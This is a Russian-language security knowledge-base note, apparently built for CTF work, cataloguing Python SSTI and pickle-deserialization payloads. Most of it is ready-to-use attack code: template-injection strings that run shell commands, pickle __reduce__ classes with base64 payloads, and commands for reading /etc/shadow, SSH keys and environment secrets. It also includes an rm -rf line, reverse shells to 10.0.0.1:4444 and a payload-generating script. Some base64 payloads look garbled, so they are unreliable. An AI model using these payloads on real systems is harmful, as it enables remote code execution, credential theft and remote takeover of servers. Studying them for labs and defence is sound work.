---
title: "Уязвимости в Python и декодирование без валидации формы ввода  - SSTI, Pickle, eval, exec"
id: note-17
created: "27.12.2025 22:44"
category: "05_Веб-уязвимости"
tags:
  - иб/веб
  - web
---

> [!info] Навигация
> [[🏠 Главная — База знаний ИБ|🏠 Главная]] · Категория: `05_Веб-уязвимости` · Дата: `27.12.2025 22:44`

# Уязвимости в Python и декодирование без валидации формы ввода  - SSTI, Pickle, eval, exec


С os.system (самый простой):
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].system('id') }}
{{ config.__class__.__init__.__globals__['os'].system('cat /flag.txt') }}


С os.popen (получить вывод):
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('ls -la').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}

С subprocess (современный способ):
{{ ''.__class__.__mro__[1].__subclasses__()[258]('cat /flag.txt', shell=True, stdout=-1).communicate()[0] }}
{{ getattr(getattr(getattr(__import__('subprocess'), 'run'), '__call__'), '__call__')(['ls'], capture_output=True).stdout }}

С eval (выполнить любой код):
{{ eval("__import__('os').system('id')") }}
{{ eval("open('/flag.txt').read()") }}

С exec (блок кода):
{{ exec("import os; print(os.popen('whoami').read())") }}


2. PICKLE Уязвимость - ВСЕ СПОСОБЫ

С os.system:
python

import pickle, base64, os

class OsSystemAttack:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

print(base64.b64encode(pickle.dumps(OsSystemAttack())).decode())

Результат: gASVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjA1jYXQgZmxhZy50eHSUhZRSlC4=

С os.popen:
python

class OsPopenAttack:
    def __reduce__(self):
        import os
        return (os.popen, ('find / -name "*flag*" 2>/dev/null',))

 Output: <os._wrap_close object> - нужно .read()


С subprocess.run:
python

class SubprocessAttack:
    def __reduce__(self):
        import subprocess
        return (subprocess.run, 
               (['cat', '/flag.txt'],),
               {'capture_output': True, 'text': True})


С subprocess.check_output:
python

class CheckOutputAttack:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output,
               ('id && ls -la && find / -name "*flag*" 2>/dev/null',),
               {'shell': True, 'text': True})


С subprocess.Popen:
python

class PopenAttack:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen,
               (['bash', '-c', 'cat /flag.txt'],),
               {'stdout': subprocess.PIPE})


С eval:
python

class EvalAttack:
    def __reduce__(self):
        return (eval, ("open('/flag.txt').read()",))
# Output: gASVNwAAAAAAAACMBGV2YWyUk5SMD29wZW4oJ2ZsYWcudHh0JykucmVhZCgpZZRSlC4=


С exec:
python

class ExecAttack:
    def __reduce__(self):
        return (exec, ("""
import os, subprocess
print("User:", os.popen('whoami').read())
print("Files:", os.popen('ls -la').read())
print("Flag:", os.popen('cat /flag.txt').read())
""",))

3. ОСНОВНЫЕ ОПАСНЫЕ ФУНКЦИИ

os модуль:
python

import os

 1. os.system - выполнить команду
os.system("id")                      # Выполняет, вывод в консоль
os.system("cat /flag.txt")      # Покажет флаг в консоли сервера

2. os.popen - выполнить и получить вывод
output = os.popen("ls -la").read()   # Читаем вывод команды
output = os.popen("cat /etc/passwd").read()

 3. os.spawn - запуск процессов
os.spawnl(os.P_NOWAIT, "/bin/ls", "ls", "-la")

 4. os.execl - замена процесса
os.execl("/bin/cat", "cat", "/flag.txt")

subprocess модуль:
python

import subprocess

1. subprocess.run - современный способ
result = subprocess.run(["cat", "/flag.txt"], 
                       capture_output=True, 
                       text=True)
print(result.stdout)  # Результат

2. subprocess.check_output - сразу получить вывод
output = subprocess.check_output(["id"], 
                                shell=True, 
                                text=True)

3. subprocess.Popen - продвинутый контроль
proc = subprocess.Popen(["bash", "-c", "cat /flag.txt"],
                       stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE)
output, error = proc.communicate()

 4. subprocess.call - простой вызов
subprocess.call(["rm", "-rf", "/tmp/*"])


builtins функции:
python

1. eval - выполнить выражение
eval("2+2")                                     # 4
eval("open('/flag.txt').read()")     # Прочитает файл

2. exec - выполнить код
exec("import os; os.system('id')")   # Выполнит команду

 3. compile + exec
code = compile("print('Hello')", "<string>", "exec")
exec(code)

 4. __import__ - динамический импорт
__import__('os').system('id')        # Альтернатива import os



4. КОМАНДЫ ДЛЯ АТАК

Информация о системе:
bash

whoami                    # Кто я
id                        # Подробная информация
uname -a                  # Инфо о системе
cat /etc/os-release       # Дистрибутив
df -h                     # Дисковое пространство
free -m                   # Оперативная память


Файлы и директории:
bash

pwd                       # Текущая директория
ls -la                    # Все файлы с правами
find / -type f -perm -4000 2>/dev/null  # SUID файлы
find / -writable 2>/dev/null | head -20 # Записываемые файлы


Поиск флагов:
bash

find / -name "*flag*" 2>/dev/null
find / -type f -name "*.txt" | xargs grep -l "flag"
cat /flag.txt 2>/dev/null || cat /flag 2>/dev/null
find /home -name "*flag*" 2>/dev/null
find /root -name "*flag*" 2>/dev/null


Чтение важных файлов:
bash

cat /etc/passwd           # Пользователи
cat /etc/shadow 2>/dev/null  # Хеши паролей (нужен root)
cat /etc/hosts            # Хосты
cat /proc/self/environ    # Переменные окружения процесса
cat ~/.bash_history       # История команд
cat ~/.ssh/id_rsa         # SSH ключи


Сеть:
bash

ifconfig || ip a          # Сетевые интерфейсы
netstat -tulpn || ss -tulpn  # Открытые порты
arp -a                    # ARP таблица
route -n                  # Таблица маршрутизации


Пользователи и привилегии:
bash

sudo -l                   # Что можно запускать через sudo
cat /etc/sudoers 2>/dev/null  # Правила sudo
groups                    # Группы пользователя

5. ПРАКТИЧЕСКИЕ PAYLOADS ДЛЯ КАЖДОЙ ФУНКЦИИ

os.system payloads:
python

 Base64 для отправки
1. whoami
gASVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAd3aG9hbWmUhZRSlC4=

2. cat /flag.txt  
gASVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjA1jYXQgZmxhZy50eHSUhZRSlC4

3. find flags
gASVQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCJmaW5kIC8gLW5hbWUgIiplbGFnKiIgMj4vZGV2L251bGxllIWUUpQu


subprocess payloads:
python

1. subprocess.check_output с shell=True
class CheckOutput:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output,
               ('find / -name "*flag*" -exec cat {} \\; 2>/dev/null',),
               {'shell': True, 'text': True})

2. subprocess.run с выводом
class RunWithOutput:
    def __reduce__(self):
        import subprocess
        return (subprocess.run,
               (['sh', '-c', 'id && pwd && ls -la && cat /flag* 2>/dev/null'],),
               {'capture_output': True, 'text': True})


eval payloads:
python

# 1. Чтение файла
class EvalRead:
    def __reduce__(self):
        return (eval, ("open('/flag.txt').read()",))

# 2. Выполнение команд
class EvalExec:
    def __reduce__(self):
        return (eval, ("__import__('os').system('id && ls -la')",))

# 3. Импорт и выполнение
class EvalImport:
    def __reduce__(self):
        return (eval, ("""
__import__('subprocess').run(
    ['find', '/', '-name', '*flag*'], 
    capture_output=True, 
    text=True
).stdout
""",))


exec payloads:
python

1. Полный разведка
class FullRecon:
    def __reduce__(self):
        return (exec, ("""
import os, subprocess, json

print("=== SYSTEM INFO ===")
print(os.popen('whoami').read())
print(os.popen('id').read())
print(os.popen('uname -a').read())

print("\\n=== FILES ===")
print(os.popen('pwd').read())
print(os.popen('ls -la').read())

print("\\n=== FLAGS ===")
print(os.popen('find / -name "*flag*" 2>/dev/null').read())
print(os.popen('cat /flag* 2>/dev/null || cat /flag 2>/dev/null').read())
""",))

6. КОМБИНИРОВАННЫЕ АТАКИ
Цепочка вызовов:
python

class ChainAttack:
    def __reduce__(self):
        import os, subprocess
        
        def attack_chain():
            # 1. Информация
            print("User:", os.popen('whoami').read())
            
            # 2. Поиск флага
            result = subprocess.run(
                'find / -type f \\( -name "*flag*" -o -name "*Flag*" \\) 2>/dev/null',
                shell=True,
                capture_output=True,
                text=True
            )
            
            # 3. Чтение найденного
            files = [f.strip() for f in result.stdout.split('\\n') if f.strip()]
            for file in files:
                try:
                    with open(file, 'r') as f:
                        print(f"\\n=== {file} ===")
                        print(f.read())
                except:
                    pass
            
            return result.stdout
        
        return (attack_chain, ())

Reverse Shell через разные методы:

Через os.system:
python

class ReverseShellOs:
    def __reduce__(self):
        import os
        return (os.system, 
               ('python3 -c \\'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\\'',))


Через subprocess:
python

class ReverseShellSubprocess:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen,
               (['bash', '-c', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'],),
               {})


7. ПОЛЕЗНЫЕ ФУНКЦИИ ДЛЯ АТАК

1. os.listdir() - список файлов:
python

os.listdir('.')                    # Текущая директория
os.listdir('/')                    # Корневая директория


2. os.getcwd() - текущая директория:
python

current_dir = os.getcwd()          # Узнать где мы

3. os.chdir() - сменить директорию:
python

os.chdir('/tmp')                   # Перейти в /tmp

4. os.environ - переменные окружения:
python

print(os.environ)                  # Все переменные
print(os.environ.get('PATH'))      # Конкретная переменная


5. os.path.exists() - проверка файла:
python

if os.path.exists('/flag.txt'):
    print("Флаг существует!")


8. АВТОМАТИЗАЦИЯ АТАК

Скрипт для генерации всех payloads:
python

import pickle
import base64

def generate_payload(command, method='os.system'):
    """Генерирует payload для разных методов"""
    
    if method == 'os.system':
        class Payload:
            def __reduce__(self):
                import os
                return (os.system, (command,))
    
    elif method == 'subprocess.check_output':
        class Payload:
            def __reduce__(self):
                import subprocess
                return (subprocess.check_output,
                       (command,),
                       {'shell': True, 'text': True})
    
    elif method == 'eval':
        class Payload:
            def __reduce__(self):
                return (eval, (f"__import__('os').popen('{command}').read()",))
    
    elif method == 'exec':
        class Payload:
            def __reduce__(self):
                return (exec, (f"import os; print(os.popen('{command}').read())",))
    
    payload = pickle.dumps(Payload())
    return base64.b64encode(payload).decode()

 Примеры
commands = [
    'id',
    'ls -la', 
    'cat /flag.txt',
    'find / -name "*flag*" 2>/dev/null'
]

methods = ['os.system', 'subprocess.check_output', 'eval', 'exec']

for cmd in commands:
    for method in methods:
        payload = generate_payload(cmd, method)
        print(f"\n{cmd} - {method}:")
        print(payload[:50] + "..." if len(payload) > 50 else payload)


ГЛАВНЫЕ ФУНКЦИИ:

1. os.system - простой, но вывод не возвращается
2. os.popen - можно получить вывод команд
3. subprocess - современный, больше контроля
4. eval - выполняет выражение, возвращает результат
5. exec - выполняет код, не возвращает результат
6. pickle + reduce = RCE через любую функцию
